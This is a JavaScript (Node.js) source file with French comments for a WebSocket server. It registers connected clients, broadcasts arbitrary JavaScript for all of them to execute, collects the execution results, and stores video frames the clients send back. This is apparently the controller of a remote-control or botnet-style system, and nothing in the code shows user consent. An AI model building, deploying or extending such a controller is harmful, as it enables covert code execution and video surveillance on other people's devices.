const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const WhitelistManager = require('../utils/whitelist');
const { getRealIP, isValidUserAgent } = require('../utils/network');
const { validateJavaScript, RateLimiter } = require('../utils/security');
const logger = require('../utils/logger');
const config = require('../config/config');

/**
 * Service de gestion du serveur WebSocket
 */
class WebSocketService {
  constructor() {
    this.clients = new Map();
    this.whitelist = new WhitelistManager();
    this.rateLimiter = new RateLimiter(10, 60000); // 10 req/min
    this.wss = null;
  }

  /**
   * Initialise et démarre le serveur WebSocket
   */
  start() {
    this.wss = new WebSocket.Server({
      port: config.ports.websocket,
      verifyClient: (info) => this._verifyClient(info)
    });

    this.wss.on('connection', (ws, req) => this._handleConnection(ws, req));
    
    logger.server(`WebSocket démarré sur ws://0.0.0.0:${config.ports.websocket}`);
    logger.server(`Autorise les User-Agent: ${config.security.allowedUserAgents.join(', ')}`);
    
    this._startStatsInterval();
    this._startCleanupInterval();
  }

  /**
   * Vérifie la validité d'une connexion cliente
   * @private
   */
  _verifyClient(info) {
    const realIP = getRealIP(info.req);
    
    // Vérification whitelist
    if (this.whitelist.isBlocked(realIP)) {
      logger.whitelist(`Refusé: IP ${realIP} dans la whitelist`);
      return false;
    }

    // Vérification rate limiting
    if (!this.rateLimiter.isAllowed(realIP)) {
      logger.warn(`Rate limit dépassé pour IP ${realIP}`);
      return false;
    }

    // Vérification User-Agent
    const userAgent = info.req.headers['user-agent'] || '';
    if (!isValidUserAgent(userAgent, config.security.allowedUserAgents)) {
      logger.warn(`User-Agent non autorisé: ${userAgent}`);
      return false;
    }

    return true;
  }

  /**
   * Gère une nouvelle connexion WebSocket
   * @private
   */
  _handleConnection(ws, req) {
    const realIP = getRealIP(req);
    
    // Double vérification de sécurité
    if (this.whitelist.isBlocked(realIP)) {
      logger.client('Connexion bloquée (whitelist)', null, `IP ${realIP}`);
      ws.close(1008, config.messages.ipBlocked);
      return;
    }

    // Vérifier IP déjà connectée
    const existingClient = Array.from(this.clients.values())
      .find(client => client.ip === realIP);
    
    if (existingClient) {
      logger.client('IP déjà connectée', existingClient.uuid, `IP ${realIP}`);
      ws.close(1000, config.messages.ipAlreadyConnected);
      return;
    }

    // Créer nouveau client
    const clientId = uuidv4();
    const clientInfo = {
      uuid: clientId,
      ip: realIP,
      userAgent: req.headers['user-agent'],
      connectedAt: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      ws: ws
    };

    this.clients.set(clientId, clientInfo);
    logger.client('Nouvelle connexion', clientId, `IP: ${realIP}`);

    // Envoi message de bienvenue
    this._sendToClient(ws, {
      type: 'welcome',
      uuid: clientId,
      message: config.messages.welcome
    });

    // Configuration des handlers
    ws.on('message', (message) => this._handleMessage(clientId, message));
    ws.on('close', () => this._handleDisconnection(clientId));
    ws.on('error', (error) => this._handleError(clientId, error));
  }

  /**
   * Traite les messages reçus des clients
   * @private
   */
  _handleMessage(clientId, message) {
    try {
      const client = this.clients.get(clientId);
      if (!client) return;

      // Mise à jour lastSeen
      client.lastSeen = new Date().toISOString();

      const data = JSON.parse(message);

      switch (data.type) {
      case 'js_executed':
        this._handleJSExecutionResult(clientId, data);
        break;
      case 'video_frame':
        this._handleVideoFrame(clientId, data);
        break;
      case 'ping':
        // Ping reçu, pas de traitement spécial
        break;
      default:
        logger.debug(`Message ${data.type} de ${clientId.substring(0, 8)}...`);
        this._sendToClient(client.ws, {
          type: 'response',
          message: 'Message reçu',
          timestamp: new Date().toISOString()
        });
      }
    } catch (err) {
      logger.error(`Parse message ${clientId.substring(0, 8)}...: ${err.message}`);
    }
  }

  /**
   * Traite les résultats d'exécution JavaScript
   * @private
   */
  _handleJSExecutionResult(clientId, data) {
    if (data.success) {
      logger.info(`[EXEC] Succès ${clientId.substring(0, 8)}... | Résultat: ${data.result?.substring(0, 50) || 'Aucun'}`);
    } else {
      logger.error(`[EXEC] Erreur ${clientId.substring(0, 8)}... | ${data.error}`);
    }
  }

  /**
   * Traite les frames vidéo
   * @private
   */
  _handleVideoFrame(clientId, data) {
    logger.debug(`[VIDEO] Frame reçue ${clientId.substring(0, 8)}... | ${data.timestamp}`);
    const client = this.clients.get(clientId);
    if (client) {
      client.lastVideoFrame = {
        data: data.data,
        timestamp: data.timestamp
      };
    }
  }

  /**
   * Gère la déconnexion d'un client
   * @private
   */
  _handleDisconnection(clientId) {
    const client = this.clients.get(clientId);
    if (client) {
      this.clients.delete(clientId);
      logger.client('Déconnexion', clientId, `IP libérée: ${client.ip}`);
    }
  }

  /**
   * Gère les erreurs WebSocket
   * @private
   */
  _handleError(clientId, error) {
    logger.error(`Client ${clientId.substring(0, 8)}...: ${error.message}`);
    this.clients.delete(clientId);
  }

  /**
   * Envoie un message à un client spécifique
   * @private
   */
  _sendToClient(ws, message) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(message));
    }
  }

  /**
   * Diffuse du code JavaScript à tous les clients connectés
   */
  broadcastJavaScript(code) {
    const validation = validateJavaScript(code);
    if (!validation.valid) {
      return {
        success: false,
        error: validation.error
      };
    }

    let successCount = 0;
    let errorCount = 0;

    this.clients.forEach((client, clientId) => {
      if (client.ws.readyState === WebSocket.OPEN) {
        try {
          this._sendToClient(client.ws, {
            type: 'execute_js',
            code: validation.sanitized,
            timestamp: new Date().toISOString()
          });
          successCount++;
        } catch (err) {
          errorCount++;
          logger.error(`Broadcast vers ${clientId.substring(0, 8)}...: ${err.message}`);
        }
      } else {
        errorCount++;
      }
    });

    logger.info(`[BROADCAST] Code envoyé | Succès: ${successCount}, Erreurs: ${errorCount} | ${code.substring(0, 30)}...`);

    return {
      success: true,
      message: `Code envoyé à ${successCount} client(s)`,
      successCount,
      errorCount
    };
  }

  /**
   * Retourne la liste des clients connectés
   */
  getClients() {
    return Array.from(this.clients.values()).map(client => ({
      uuid: client.uuid,
      ip: client.ip,
      userAgent: client.userAgent,
      connectedAt: client.connectedAt,
      lastSeen: client.lastSeen
    }));
  }

  /**
   * Démarre l'affichage périodique des statistiques
   * @private
   */
  _startStatsInterval() {
    setInterval(() => {
      if (this.clients.size > 0) {
        logger.info(`[STATS] ${this.clients.size} client(s) connecté(s)`);
      }
    }, 30000);
  }

  /**
   * Démarre le nettoyage périodique du rate limiter
   * @private
   */
  _startCleanupInterval() {
    setInterval(() => {
      this.rateLimiter.cleanup();
    }, 300000); // 5 minutes
  }

  /**
   * Arrête le serveur WebSocket
   */
  stop() {
    if (this.wss) {
      this.wss.close();
      logger.server('WebSocket arrêté');
    }
  }
}

module.exports = WebSocketService;